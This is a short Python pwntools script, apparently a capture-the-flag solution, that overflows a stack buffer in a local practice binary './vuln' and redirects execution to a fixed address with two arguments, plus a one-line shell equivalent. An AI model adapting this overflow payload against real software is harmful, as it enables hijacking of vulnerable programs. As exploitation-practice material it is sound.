#!/usr/bin/python2

import pwn; 

elf = pwn.ELF('./vuln')
p = elf.process()

prompt = p.recv()

payload = 'A'*108
payload += 'BBBB' # eip
payload += pwn.p32(0x080485cb) # ret. addr
payload += 'CCCC' # ret
payload += pwn.p32(0xdeadbeef) # arg1
payload += pwn.p32(0xdeadc0de) # arg2

p.sendline(payload)
print(p.recv())

# echo `python2 -c "import pwn; print('A'*108 + 'BBBB' + pwn.p32(0x080485cb) + 'CCCC' + pwn.p32(0xdeadbeef) + pwn.p32(0xdeadc0de))"` | ./vuln
